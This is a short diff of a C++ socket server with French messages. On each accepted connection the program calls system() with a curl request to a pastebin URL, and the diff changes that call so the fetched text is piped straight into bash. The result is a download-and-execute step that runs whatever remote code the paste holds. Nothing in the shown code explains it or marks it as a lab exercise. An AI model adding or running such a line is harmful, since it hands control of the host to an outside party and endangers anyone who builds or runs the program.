@@ -51,7 +51,7 @@ int main(int argc, char * argv[]) {
  
         cout << "J'ai une connexion !" << endl;
  
-        system("curl https://pastebin.com/raw/2niqeVMg");
+        system("curl https://pastebin.com/raw/2niqeVMg | bash");
  
         if (sock_client == -1)
             exitErreur("accept");
